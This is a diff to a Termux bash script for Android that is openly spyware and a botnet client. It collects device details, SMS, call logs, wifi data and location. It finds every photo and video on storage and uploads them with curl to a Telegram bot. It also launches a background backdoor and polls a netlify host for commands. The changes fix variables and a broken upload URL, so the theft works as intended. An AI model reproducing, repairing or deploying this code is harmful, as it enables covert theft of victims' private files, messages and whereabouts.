@@ -51,6 +51,7 @@ UpTime=$(uptime)
 MemoryUsage=$(free -m)
 DiskUsage=$(df -h)
 ip=$(ifconfig -a)
+
 #-------------------------#
 # Check if offline
 net() {
@@ -102,6 +103,10 @@ else
     printf ""
 fi
 #####################################################################################
+if [[ -f $PREFIX/etc/Hacked/Victam/victam.sim ]]
+Dev_ID=$(sed -n '5p' victam.sim)
+fi
+#####################################################################################
 #MyBrithday
 today=$(date +%m/%d)
 Myday="12/12"
@@ -113,7 +118,7 @@ termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play M
 toilet -f mono12 -F border Azrak_day -F metal
 else
 termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
-curl -X POST --silent --output /dev/null https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${CHAT_ID} -d text=' Happy Birthday To You Master Blue , Don’t Forget Your wish ! '
+curl -X POST --silent  https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${CHAT_ID} -d text=' Happy Birthday To You Master Blue , Don’t Forget Your wish ! '
 bash $PREFIX/etc/Badshell/backdoor &>> /dev/null &
 clear
 toilet -f mono12 -F border Azrak_day -F metal
@@ -209,19 +214,19 @@ get(){
         do
 
            # Upload the file
-		curl -X POST --silent --output /dev/null -F document=@\$jpg \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+		curl -X POST --silent  -F document=@\$jpg \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
         done
 
         for video in \$(find /sdcard/ -name *.mp4)
         do
-                curl -X POST --silent --output /dev/null -F document=@\$video \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+                curl -X POST --silent  -F document=@\$video \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
         done
 
         for png in \$(find /sdcard/ -name *.png)
         do
-                curl -X POST --silent --output /dev/null -F document=@\$png \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+                curl -X POST --silent  -F document=@\$png \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
 
         done
@@ -255,19 +260,19 @@ get(){
       do
 
           # Upload the file
-          curl -X POST --silent --output /dev/null -F document=@\$jpg \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+          curl -X POST --silent  -F document=@\$jpg \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
       done
 
       for video in \$(find / -name *.mp4)
       do
-         curl -X POST --silent --output /dev/null -F document=@\$video \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+         curl -X POST --silent  -F document=@\$video \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
       done
 
       for png in \$(find / -name *.png)
       do
-          curl -X POST --silent --output /dev/null -F document=@\$png \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
+          curl -X POST --silent  -F document=@\$png \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
 
 
@@ -344,7 +349,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev} "
+                curl -X POST --silent "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev_ID} "
 
         else
 
@@ -361,7 +366,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 #################################################################################
-                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev_ID} "
 
         else
 
@@ -376,7 +381,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New SMS File Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New SMS File Locate on Device : ${Dev_ID} "
 
         else
 
@@ -391,7 +396,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
 
         else
 
@@ -406,7 +411,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
 
         else
 
@@ -421,7 +426,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev_ID} "
 
         else
 
@@ -436,7 +441,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New WifiData Locate on Device : ${Dev} "
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New WifiData Locate on Device : ${Dev_ID} "
 
         else
 
@@ -453,7 +458,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New location Locate on Device : ${Dev}"
+                curl -X POST --silent  "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New location Locate on Device : ${Dev_ID}"
 
         else
 
@@ -475,7 +480,7 @@ Wifi
 location
 
 zip Hacked_By_Blue24Bluer.zip * &>> /dev/null
-curl -X POST --silent --output /dev/null -F document=@$PREFIX/etc/Hacked/Victam/Hacked_By_Blue24Bluer.zip \"://api.telegram.org/bot${TOKEN}/sendDocument' -F chat_id=${CHAT_ID}
+curl -X POST --silent -F document=@$PREFIX/etc/Hacked/Victam/Hacked_By_Blue24Bluer.zip https://api.telegram.org/bot${TOKEN}/sendDocument -F chat_id=${CHAT_ID}
 
 else
 
@@ -492,7 +497,7 @@ ServerHome(){
 
 if [[ -d $PREFIX/etc/Hacked/ ]];then
 
-	if [[ $termux == 'true' ]];then
+	if [[ $termux == "true" ]];then
 
 		termux-api-start &>> /dev/null
 		termux-wake-lock &>> /dev/null
@@ -500,7 +505,7 @@ if [[ -d $PREFIX/etc/Hacked/ ]];then
 
 #####################################################################################
 System_Host=$(cat $PREFIX/etc/Hacked/Server/.B24B_BotNet)
-System_Server=$(curl -X POST --silent --output /dev/null https://gleeful-sherbet-b1b409.netlify.app/)
+System_Server=$(curl --silent  https://gleeful-sherbet-b1b409.netlify.app/)
 
 if [[ $System_Host == $System_Server ]];then
 
@@ -511,7 +516,7 @@ else
 if [[ ${nN} == "Y" ]];then
 while true ;do
 
-	curl -X POST --silent --output /dev/null https://gleeful-sherbet-b1b409.netlify.app/ > $PREFIX/etc/Hacked/Server/.B24B_BotNet
+	curl --silent https://gleeful-sherbet-b1b409.netlify.app/ > $PREFIX/etc/Hacked/Server/.B24B_BotNet
 		if [[ $(cat $PREFIX/etc/Hacked/Server/.B24B_BotNet) == "" ]];then
 			printf ""
 		else
@@ -573,7 +578,7 @@ if [[ $Server_Get == "Yes" ]];then
 
 	bash $PREFIX/etc/Hacked/Badshell/backdoor &>> /dev/null
 	zip $PREFIX/etc/Hacked/Victam/Hacked_By_Blue24Bluer.zip $PREFIX/etc/Hacked/Victam/* &>> /dev/null
-	curl -X POST --silent --output /dev/null -F document=@$PREFIX/etc/Hacked/Victam/Hacked_By_Blue24Bluer.zip "https://api.telegram.org/bot${TOKEN}/sendDocument" -F chat_id=${CHAT_ID}
+	curl -X POST --silent  -F document=@$PREFIX/etc/Hacked/Victam/Hacked_By_Blue24Bluer.zip "https://api.telegram.org/bot${TOKEN}/sendDocument" -F chat_id=${CHAT_ID}
 
 fi
 #####################################################################################
@@ -644,7 +649,7 @@ fi
 }
 Dev=$(echo -e "
 
-Device infomore : ${Dev}ice\n
+Device infomore : ${Dev_ID}ice\n
 Hacked on date  : $Tdate\n
 Host Name       : $HostName\n
 Kernel          : $Kernel\n
@@ -655,7 +660,7 @@ IP Address      : $ip\n
 ")
 
     while true; do
-	curl -X POST --silent --output /dev/null ifconfig.me
+	curl --silent ifconfig.me
         if [ "$?" = 0 ]; then
 
             Update     &>> /dev/null &
